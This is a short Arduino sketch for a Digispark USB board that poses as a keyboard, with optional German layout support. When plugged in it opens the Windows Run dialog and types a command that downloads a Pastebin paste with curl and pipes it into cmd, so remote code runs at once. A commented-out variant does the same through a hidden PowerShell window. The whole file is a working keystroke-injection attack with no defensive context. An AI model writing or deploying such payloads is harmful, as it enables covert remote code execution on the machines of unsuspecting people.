// pastebin paste id
#define PASTE_ID "4A47tmR5"

// use german keyboard layout (qwertz)
#define LAYOUT_DE

#include "src/DigisparkKeyboard/DigiKeyboard.h"

#ifdef LAYOUT_DE
#include "src/DigisparkKeyboard/DigiKeyboardDe.h"
#endif

#define CMD "cmd /C curl https://pastebin.com/raw/" PASTE_ID "|cmd"

// old version (hides shell)
// #define CMD "powershell -WindowStyle Hidden -Command \"&{echo \\\"curl https://pastebin.com/raw/" PASTE_ID " |powershell -Command -\\\" |cmd}\""

void setup()
{
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

    DigiKeyboard.delay(150);

#ifdef LAYOUT_DE
    DigiKeyboardDe.println(CMD);
#else
    DigiKeyboard.println(CMD);
#endif
}

void loop()
{
    DigiKeyboard.update();
}
